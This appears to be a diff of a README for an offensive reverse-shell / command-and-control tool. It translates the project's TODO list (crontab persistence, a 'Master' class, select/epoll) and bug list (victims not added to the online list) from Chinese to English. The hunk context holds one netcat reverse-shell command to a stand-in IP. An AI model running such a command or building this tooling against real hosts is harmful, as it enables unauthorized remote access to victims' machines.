@@ -38,16 +38,15 @@ nc.exe -e /bin/bash 1.3.3.7 4444
 
 
 #### TODO
-- [x] 实现添加 crontab 的功能
-- [x] 实现删除 crontab 的功能
-- [ ] 使用异步 HTTP 库 grequests
-- [ ] Master 面向对象
-- [ ] 抛弃多线程 , 使用 select/epoll 来解决并发问题
+- [x] Add an item to crontab
+- [x] Delete an item from crontab
+- [ ] create a class to hold Master
+- [ ] select/epoll
 
 #### Bugs
 
-- [x] 主机上线但是并没有被加入列表
-- [ ] socket 在 recv 的时候会出现假死的情况 (暂时不能复现)
+- [x] A victim is connected but didn't add to online list
+- [ ] socket stuck on rece()
 
 #### LICENSE
 
